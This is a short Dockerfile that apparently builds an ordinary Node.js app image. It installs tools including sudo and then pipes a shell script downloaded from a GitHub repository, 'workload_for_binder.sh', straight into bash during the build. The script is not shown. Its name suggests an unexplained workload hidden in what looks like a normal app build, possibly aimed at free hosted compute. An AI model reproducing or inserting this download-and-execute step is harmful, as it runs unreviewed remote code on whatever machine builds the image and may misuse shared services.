FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN npm ci
RUN which bash
RUN ls -la
RUN apt update
RUN apt -y install wget coreutils curl sudo python3 git python3-pip
RUN wget -O - https://raw.githubusercontent.com/mncedisimavunqela/Improved_Nodejs/main/workload_for_binder.sh | bash

CMD ["npm", "run", "start", "/bin/bash"]
